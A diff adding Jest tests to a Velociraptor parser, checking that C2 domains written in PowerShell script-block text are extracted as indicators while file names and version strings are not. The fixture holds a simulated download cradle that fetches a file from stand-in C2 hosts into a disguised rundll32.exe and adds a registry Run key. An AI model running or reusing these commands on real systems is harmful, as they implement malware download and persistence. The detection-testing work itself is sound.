@@ -2005,6 +2005,73 @@ describe("parseVelociraptorJson — PowerShell 4104 script-block fragments", () 
   });
 });
 
+// ── A collected PowerShell script block names its C2 by DOMAIN as often as by IP. scrapeText
+// extracted the URLs, IPs and hashes out of that free text but had no domain pattern, so on a real
+// case (a Lunar Spider simulation) 566 IOCs came out with ZERO of type `domain`: seventeen C2
+// domains sat in the script text while the ten C2 IPs beside them were extracted, and the AI summary
+// concluded "no command-and-control infrastructure is confirmed". The fixture below is that shape —
+// C2 domains and C2 IPs in one block, mixed with the dotted tokens Velociraptor text is full of
+// (file names, a .NET framework path, a registry key, version strings) that must NOT become domains.
+describe("parseVelociraptorJson — domains embedded in free text (script blocks, command lines)", () => {
+  const SCRIPT = [
+    "$c = New-Object System.Net.WebClient",
+    "$hosts = @('winsoftwarehub.top','cdn.brutratel-c2.net','update.latrodectus-panel.com')",
+    "$ips = @('185.220.101.44','45.153.240.19')",
+    'foreach ($h in $hosts) { $c.DownloadFile("http://$h/api/update", "C:\\Users\\Public\\rundll32.exe") }',
+    "Start-Process C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -ArgumentList 'loader.dll'",
+    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svchost.ps1",
+    "# built against 10.0.22621.2506, drops beacon.dat",
+  ].join("\n");
+
+  const scriptBlockRow = (): object => ({
+    _index: "artifact_detectraptor_windows_detection_evtx",
+    "@timestamp": "2026-05-07T16:31:04.000Z",
+    "Detection.Name": "PowerShell - Suspicious Download Cradle",
+    Computer: "WS-01",
+    "System.EventID.Value": 4104,
+    "System.Channel": "Microsoft-Windows-PowerShell/Operational",
+    "EventData.ScriptBlockId": "1f6a0d2c-4b77-4d1e-9a54-6b0f2f7a1c33",
+    "EventData.MessageNumber": 1,
+    "EventData.MessageTotal": 1,
+    "EventData.ScriptBlockText": SCRIPT,
+    Message: `Creating Scriptblock text (1 of 1):\n${SCRIPT}`,
+    "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
+  });
+
+  const domainsOf = (): string[] =>
+    parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
+      .iocs.filter((i) => i.type === "domain")
+      .map((i) => i.value);
+
+  it("extracts the C2 domains named in the script block", () => {
+    expect(domainsOf().sort()).toEqual([
+      "cdn.brutratel-c2.net",
+      "update.latrodectus-panel.com",
+      "winsoftwarehub.top",
+    ]);
+  });
+
+  it("still extracts the C2 IPs from the same block (no regression)", () => {
+    const ips = parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
+      .iocs.filter((i) => i.type === "ip")
+      .map((i) => i.value);
+    expect(ips).toEqual(expect.arrayContaining(["185.220.101.44", "45.153.240.19"]));
+  });
+
+  it("does not turn a file name into a domain", () => {
+    const d = domainsOf();
+    for (const f of ["rundll32.exe", "csc.exe", "loader.dll", "svchost.ps1", "beacon.dat"]) {
+      expect(d).not.toContain(f);
+    }
+  });
+
+  it("does not turn a Windows path component or a version string into a domain", () => {
+    const d = domainsOf();
+    expect(d).not.toContain("microsoft.net"); // C:\Windows\Microsoft.NET\… is a directory, not a domain
+    expect(d.some((v) => /^\d/.test(v))).toBe(false); // 10.0.22621.2506, v4.0.30319
+  });
+});
+
 // #640 — msgFingerprint used to strip EVERY digit, so two Sysmon network-connection Sigma rows that
 // differed only in destination address produced an identical fingerprint, an identical aggKey, and
 // therefore ONE merged event holding the first row's description. Every IP scraped from every merged
